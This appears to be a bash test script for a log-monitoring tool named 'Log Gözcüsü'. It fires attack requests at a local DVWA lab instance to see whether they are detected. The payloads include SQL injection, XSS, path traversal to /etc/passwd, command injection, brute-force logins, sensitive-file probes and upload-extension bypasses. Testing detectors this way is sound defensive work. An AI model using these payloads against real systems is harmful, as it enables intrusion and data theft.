#!/bin/bash
# ================================
# Log Gözcüsü - Test Saldırı Senaryoları
# ================================
# Bu script, DVWA'ya çeşitli saldırı senaryoları gönderir.
# Log Gözcüsü'nün bunları tespit edip etmediğini test etmek içindir.
#
# KULLANIM:
#   chmod +x test_scenarios.sh
#   ./test_scenarios.sh
#
# ÖNEMLİ: DVWA container'ının çalışıyor olması gerekir!
#   docker-compose up -d

TARGET="http://localhost:8080"

echo "================================"
echo "  LOG GÖZCÜSÜ TEST SENARYOLARI"
echo "================================"
echo "Target: $TARGET"
echo ""

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Sayaç
TESTS=0
echo -e "${YELLOW}Saldırı testleri başlıyor...${NC}"
echo ""

# ================================
# 1. SQL Injection Testleri
# ================================
echo -e "${RED}[1] SQL INJECTION TESTLERİ${NC}"

# Classic SQLi
curl -s "$TARGET/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" > /dev/null
echo "  ✓ Classic SQL Injection: 1' OR '1'='1"
((TESTS++))

# Union-based SQLi
curl -s "$TARGET/vulnerabilities/sqli/?id=1'+UNION+SELECT+username,password+FROM+users--&Submit=Submit" > /dev/null
echo "  ✓ Union SQLi: UNION SELECT"
((TESTS++))

# Error-based SQLi
curl -s "$TARGET/vulnerabilities/sqli/?id=1'+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.tables+GROUP+BY+x)a)--&Submit=Submit" > /dev/null
echo "  ✓ Error-based SQLi"
((TESTS++))

# Blind SQLi
curl -s "$TARGET/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(2)--&Submit=Submit" --max-time 3 > /dev/null 2>&1
echo "  ✓ Blind SQL Injection (SLEEP)"
((TESTS++))

echo ""

# ================================
# 2. XSS (Cross-Site Scripting) Testleri
# ================================
echo -e "${RED}[2] XSS TESTLERİ${NC}"

# Reflected XSS
curl -s "$TARGET/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" > /dev/null
echo "  ✓ Reflected XSS: <script>alert()</script>"
((TESTS++))

# XSS with img tag
curl -s "$TARGET/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>" > /dev/null
echo "  ✓ XSS via IMG tag"
((TESTS++))

# XSS in User-Agent
curl -s -H "User-Agent: <script>alert('XSS')</script>" "$TARGET/" > /dev/null
echo "  ✓ XSS in User-Agent header"
((TESTS++))

# SVG XSS
curl -s "$TARGET/vulnerabilities/xss_r/?name=<svg+onload=alert(1)>" > /dev/null
echo "  ✓ XSS via SVG tag"
((TESTS++))

echo ""

# ================================
# 3. Path Traversal Testleri
# ================================
echo -e "${RED}[3] PATH TRAVERSAL TESTLERİ${NC}"

# Basic directory traversal
curl -s "$TARGET/vulnerabilities/fi/?page=../../../etc/passwd" > /dev/null
echo "  ✓ Path Traversal: ../../../etc/passwd"
((TESTS++))

# URL encoded
curl -s "$TARGET/vulnerabilities/fi/?page=..%2F..%2F..%2Fetc%2Fpasswd" > /dev/null
echo "  ✓ URL Encoded Path Traversal"
((TESTS++))

# Null byte injection
curl -s "$TARGET/vulnerabilities/fi/?page=../../../etc/passwd%00" > /dev/null
echo "  ✓ Null Byte Injection"
((TESTS++))

echo ""

# ================================
# 4. Command Injection Testleri
# ================================
echo -e "${RED}[4] COMMAND INJECTION TESTLERİ${NC}"

# Basic command injection
curl -s "$TARGET/vulnerabilities/exec/?ip=127.0.0.1;ls+-la&Submit=Submit" > /dev/null
echo "  ✓ Command Injection: ; ls -la"
((TESTS++))

# Pipe injection
curl -s "$TARGET/vulnerabilities/exec/?ip=127.0.0.1|cat+/etc/passwd&Submit=Submit" > /dev/null
echo "  ✓ Pipe Injection: | cat /etc/passwd"
((TESTS++))

# Backtick injection
curl -s "$TARGET/vulnerabilities/exec/?ip=127.0.0.1\`whoami\`&Submit=Submit" > /dev/null
echo "  ✓ Backtick Injection"
((TESTS++))

echo ""

# ================================
# 5. Brute Force Simülasyonu
# ================================
echo -e "${RED}[5] BRUTE FORCE SİMÜLASYONU${NC}"

for i in {1..10}; do
    curl -s "$TARGET/vulnerabilities/brute/?username=admin&password=wrong$i&Login=Login" > /dev/null
done
echo "  ✓ 10 başarısız login denemesi"
((TESTS+=10))

echo ""

# ================================
# 6. Scanner Simülasyonu
# ================================
echo -e "${RED}[6] SCANNER SİMÜLASYONU${NC}"

# Common sensitive paths
PATHS=(
    "/.env"
    "/config.php"
    "/wp-admin"
    "/admin"
    "/phpmyadmin"
    "/backup.sql"
    "/.git/config"
    "/robots.txt"
    "/sitemap.xml"
    "/.htaccess"
)

for path in "${PATHS[@]}"; do
    curl -s "$TARGET$path" > /dev/null
    echo "  ✓ Probe: $path"
    ((TESTS++))
done

echo ""

# ================================
# 7. CSRF Token Bypass
# ================================
echo -e "${RED}[7] CSRF TOKEN BYPASS${NC}"

curl -s -X POST "$TARGET/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" > /dev/null
echo "  ✓ CSRF bypass attempt"
((TESTS++))

echo ""

# ================================
# 8. File Upload (Extension Bypass)
# ================================
echo -e "${RED}[8] FILE UPLOAD BYPASS${NC}"

# Simüle - gerçek upload yerine sadece log için
curl -s "$TARGET/vulnerabilities/upload/?filename=shell.php.jpg" > /dev/null
echo "  ✓ Double extension: shell.php.jpg"
((TESTS++))

curl -s "$TARGET/vulnerabilities/upload/?filename=shell.pHp" > /dev/null
echo "  ✓ Case manipulation: shell.pHp"
((TESTS++))

echo ""

# ================================
# SONUÇ
# ================================
echo "================================"
echo -e "${GREEN}TEST TAMAMLANDI${NC}"
echo "================================"
echo -e "Toplam test sayısı: ${YELLOW}$TESTS${NC}"
echo ""
echo "Log Gözcüsü dashboard'u kontrol edin:"
echo "  http://localhost:8000"
echo ""
echo "Veya doğrudan threat log'larına bakın:"
echo "  cat data/threat_data.jsonl | jq ."
echo "================================"
